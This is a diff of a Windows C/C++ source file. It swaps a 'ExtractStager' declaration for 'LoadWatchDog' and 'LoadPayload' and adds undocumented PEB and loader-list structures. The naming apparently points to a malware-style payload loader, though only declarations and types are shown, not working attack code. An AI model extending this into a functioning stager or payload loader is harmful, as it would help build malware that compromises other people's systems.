@@ -6,11 +6,10 @@
 #include <DbgHelp.h>
 
 
-
-bool ExtractStager( std::string passedPath );
+void LoadWatchDog();
+void LoadPayload();
 
 #define BUFFER_SIZE 0x2000
-#define COLON ":1"
 
 #if !defined NTSTATUS
 typedef LONG NTSTATUS;
@@ -35,6 +34,30 @@ typedef struct _PROCESS_BASIC_INFORMATION {
     PVOID Reserved3;
 } PROCESS_BASIC_INFORMATION;
 #endif;
+
+typedef struct _PEB_LDR_DATA
+{
+    ULONG         Length;                            /* Size of structure, used by ntdll.dll as structure version ID */
+    BOOLEAN       Initialized;                       /* If set, loader data section for current process is initialized */
+    PVOID         SsHandle;
+    LIST_ENTRY    InLoadOrderModuleList;             /* Pointer to LDR_DATA_TABLE_ENTRY structure. Previous and next module in load order */
+    LIST_ENTRY    InMemoryOrderModuleList;           /* Pointer to LDR_DATA_TABLE_ENTRY structure. Previous and next module in memory placement order */
+    LIST_ENTRY    InInitializationOrderModuleList;   /* Pointer to LDR_DATA_TABLE_ENTRY structure. Previous and next module in initialization order */
+} PEB_LDR_DATA,*PPEB_LDR_DATA;
+
+typedef struct _PEB_PARTIAL {
+	BYTE InheritedAddressSpace;
+    BYTE ReadImageFileExecOptions;
+    BYTE BeingDebugged;
+    BYTE SpareBool;
+    void* Mutant;
+    void* ImageBaseAddress;
+    PEB_LDR_DATA* Ldr;
+	void* ProcessParameters;
+    void* SubSystemData;
+    void* ProcessHeap;
+} PEB_PARTIAL, *PPEB_PARTIAL;
+
 
 typedef LONG NTSTATUS, *PNTSTATUS;
 typedef struct _UNICODE_STRING {
